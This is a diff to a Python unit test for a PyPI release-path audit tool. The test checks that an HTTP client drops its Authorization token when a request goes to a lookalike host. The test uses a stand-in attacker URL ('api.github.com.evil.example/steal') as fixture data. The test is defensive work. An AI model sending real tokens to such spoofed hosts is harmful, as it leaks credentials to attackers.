@@ -758,11 +758,13 @@ class PyPIReleasePathAuditTests(unittest.TestCase):
         response.status = 200
         response.read.return_value = b"{}"
         response.__enter__.return_value = response
-        with mock.patch("tools.pypi_release_path_audit.urllib.request.urlopen", return_value=response) as urlopen:
+        response.geturl.return_value = "https://api.github.com.evil.example/steal"
+        with mock.patch("tools.pypi_release_path_audit.urllib.request.build_opener") as opener:
+            opener.return_value.open.return_value = response
             status, _ = Http("placeholder-token").get("https://api.github.com.evil.example/steal")
 
         self.assertEqual(status, 200)
-        self.assertNotIn("Authorization", urlopen.call_args.args[0].headers)
+        self.assertNotIn("Authorization", opener.return_value.open.call_args.args[0].headers)
 
     def test_one_provenance_fetch_failure_keeps_identity_and_tag_unknown(self):
         responses = fixture()
